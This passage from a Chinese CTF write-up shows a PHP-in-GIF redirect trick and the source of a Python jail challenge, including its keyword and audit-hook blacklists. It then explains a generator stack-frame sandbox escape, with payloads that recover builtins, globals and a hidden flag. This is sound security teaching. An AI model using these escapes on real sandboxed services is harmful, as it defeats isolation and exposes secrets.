+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;GIF89a&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php?cmd=xxxx&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>操作同上</p>
+<h2><span id="mossforn"> mossforn</span></h2>
+<p>pyjail，代码如下</p>
+<p><a target="_blank" rel="noopener" href="http://main.py">main.py</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>main.py负责接受我们的代码，然后将其创建一个新的python文件到uploads文件夹下，这个python文件经过测试会生成两个文件，<a target="_blank" rel="noopener" href="http://xn--4gqvd.py">一个.py</a>，一个.txt</p>
+<p>.py复制的是runner.py里的内容</p>
+<p>.txt是我们的代码</p>
+<p><a target="_blank" rel="noopener" href="http://runner.py">runner.py</a>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>runner.py就是通过读取生成的txt内容，并且执行</p>
+<p>这里经过了三重过滤：</p>
+<ul>
+<li>source_simple_check()，检测双下划线、getattr、exit，以及检查是否输入的是ascii范围内的符号</li>
+<li>block_wrapper，定义的是audit hook，使用的黑名单，这几个都不能用，而且由于audit hook处于python的底层实现，所以无法通过常规变换绕过</li>
+<li>source_opcode_checker，将传入的代码变成opcode，防止加载globals、name、method这些操作</li>
+</ul>
+<p>几乎无懈可击啊T_T</p>
+<p>但是还是通过一个trick绕过了</p>
+<p>这就是大名鼎鼎的栈帧沙箱逃逸</p>
+<h3><span id="生成器"> 生成器</span></h3>
+<p>利用yield关键字来定义一个生成器。yield用于产生一个值，并且在保留当前状态的同时，暂停函数的执行。当下次调用这个生成器的时候，函数就会从上次暂停的状态继续进行。直至遇见下一个yield状态或者程序结束</p>
+<p>example:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params"><span class="built_in">max</span></span>):</span><br><span class="line">	n, a, b = <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">max</span>:</span><br><span class="line">		<span class="keyword">yield</span> b <span class="comment">#返回b的值</span></span><br><span class="line">        a, b = b, a+b</span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line">f = fib(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(f) <span class="comment">#&lt;generator object fib at 0x00000296B4189C40&gt;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(i) <span class="comment"># 1 1 2 3 5 8</span></span><br></pre></td></tr></table></figure>
+<p>生成器的return返回值必须从stopIteration异常中获取：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params"><span class="built_in">max</span></span>):</span><br><span class="line">	n, a, b = <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">max</span>:</span><br><span class="line">		<span class="keyword">yield</span> b <span class="comment">#返回b的值</span></span><br><span class="line">        a, b = b, a+b</span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line">f = fib(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(f) <span class="comment">#&lt;generator object fib at 0x00000296B4189C40&gt;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = <span class="built_in">next</span>(f)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;value: &#x27;</span>, x)</span><br><span class="line">    <span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Return value&#x27;</span>, e.value) <span class="comment"># Return value done</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h3><span id="生成器的属性"> 生成器的属性</span></h3>
+<p>生成器有如下属性：</p>
+<p><code>gi_code</code>：<strong>生成器对应的code对象</strong></p>
+<p><code>gi_frame</code>：生成器对应的frame(栈帧)对象</p>
+<p><code>gi_running</code>：判断生成器的函数是否正在执行。生成器函数在yield以后，执行yield的下一行代码前处于冻结状态，此时<code>gi_running</code>为0</p>
+<p><code>gi_yieldfrom</code>：如果生成器正在从另一个生成器中yield值，斥责该对象为生成器对象的引用，否则为<code>None</code></p>
+<p><code>gi_frame.f_locals</code>：<strong>一个字典，包含生成器当前帧的本地变量</strong></p>
+<p>关键在于<code>gi_frame</code>。它指向生成器或者写成当前执行的帧对象。如果这个生成器或者协程在执行的话，帧对象表示的是代码执行的当前上下变量、执行的字节码指令等信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取生成器的当前帧信息</span></span><br><span class="line">frame = gen.gi_frame</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出生成器的当前帧信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, frame.f_locals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Global Variables:&quot;</span>, frame.f_globals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Code Object:&quot;</span>, frame.f_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</span><br></pre></td></tr></table></figure>
+<p>输出结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Local Variables: &#123;&#125;</span><br><span class="line"></span><br><span class="line">Global Variables: &#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000002051C3D2150&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;d:\\CTF\\CISCN2024\\python_learning\\frame_example.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;my_generator&#x27;: &lt;function my_generator at 0x000002051C2C0680&gt;, &#x27;gen&#x27;: &lt;generator object my_generator at 0x000002051C2789E0&gt;, &#x27;frame&#x27;: &lt;frame at 0x000002051C280820, file &#x27;d:\\CTF\\CISCN2024\\python_learning\\frame_example.py&#x27;, line 1, code my_generator&gt;&#125;</span><br><span class="line">Code Object: &lt;code object my_generator at 0x000002051C3D9C30, file &quot;d:\CTF\CISCN2024\python_learning\frame_example.py&quot;, line 1&gt;</span><br><span class="line"></span><br><span class="line">Instruction Pointer: 0</span><br></pre></td></tr></table></figure>
+<h3><span id="栈帧"> 栈帧</span></h3>
+<p>Python中的栈帧，也称为帧，是用于执行代码的数据结构，每当python执行一个函数或者方法的时候，就会新建一个栈帧，用于储存该函数或者方法的局部变量、参数、返回地址以及其他执行相关的信息，这些栈帧会按被调用的顺序组织成一个栈，也叫调用栈</p>
+<p>frame的几个属性：</p>
+<ul>
+<li><code>f_locals</code>：一个字典，包含了函数或者方法的局部变量。字典中：<code>key</code>是变量名，<code>value</code>是变量的值</li>
+<li><code>f_globals</code>：一个字典，包含了函数或者方法的全局变量。字典中：<code>key</code>是全局变量名，<code>value</code>是变量的值</li>
+<li><code>f_code</code>，一个代码对象，包含了函数或者方法的字节码指令、常量、变量名等信息</li>
+<li><code>f_lasti</code>：整数，用于表示最后执行的字节码指令的索引</li>
+<li><code>f_back</code>：指向上一级调用栈帧的引用，用于构建调用栈</li>
+</ul>
+<h3><span id="栈帧逃逸"> 栈帧逃逸</span></h3>
+<p>利用就是通过<code>f_back</code>，可以理解为回到前一帧，此时就能够逃逸出去，获取到globals全局符号表，比如下面这个代码，将builtins置空：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(code, &#123;</span><br><span class="line">        <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&quot;randint&quot;</span>: random.randint,</span><br><span class="line">        <span class="string">&quot;randrange&quot;</span>: random.randrange,</span><br><span class="line">        <span class="string">&quot;seed&quot;</span>: random.seed,</span><br><span class="line">        <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">    &#125;, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
+<p>因为将builtins置空了，所以我们不能够直接使用next函数来获得帧，可以改成下面的形式：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+<p>这样就能够正常获取到帧了</p>
+<p>通过帧获取到flag，flag可能会有以下几种形式存在：</p>
+<ul>
+<li>flag是常量，写在了运行的这个python脚本里，但是我们不知道里面的内容。此时由于是常量，我们就可以通过<code>f_code</code>后取到代码对象，从而获取到常量</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">		<span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">    builtin = frame.f_back.f_back.f_back.f_locals[<span class="string">&#x27;__builtins__&#x27;</span>] <span class="comment">#这一步获取builtin就能够获取到一些基本函数，方便我们后续操作</span></span><br><span class="line">    code = frame.f_back.f_back.f_back.f_code</span><br><span class="line">    <span class="built_in">print</span>(code.co_consts)</span><br></pre></td></tr></table></figure>
+<p>测试结果如下：</p>
+<img src="/posts/undefined/16.png" class title="awa">
+<p>可以看见我们获取到了<code>THIS_IS_THE_FLAG</code>常量</p>
+<ul>
+<li>flag是变量，通过以下几种方式引入：
+<ul>
+<li>读取某个文件的flag<code>(open('xxx').readline().strip())</code></li>
+<li>引入某个py文件<code>from secret import flag</code></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">		<span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">    builtin = frame.f_back.f_back.f_back.f_locals[<span class="string">&#x27;__builtins__&#x27;</span>] <span class="comment">#这一步获取builtin就能够获取到一些基本函数，方便我们后续操作</span></span><br><span class="line">    gl = frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    <span class="built_in">print</span>(gl)</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/17.png" class title="awa">
+<ul>
+<li>注，可以通过<code>dir()</code>查看某个东西里面的东西，例如<code>dir(__builtins__)</code></li>
+</ul>
+<h3><span id="骚操作"> 骚操作</span></h3>
+<p>通过栈帧逃逸修改globals里的函数，比如L3HCTF 2024里的interactive problem revenge</p>
+<p>题目描述的是让我们写一个算法，在5秒钟内分解一个大数，且分解出来的p q必须大于10万</p>
+<p>其中它的代码如下：</p>
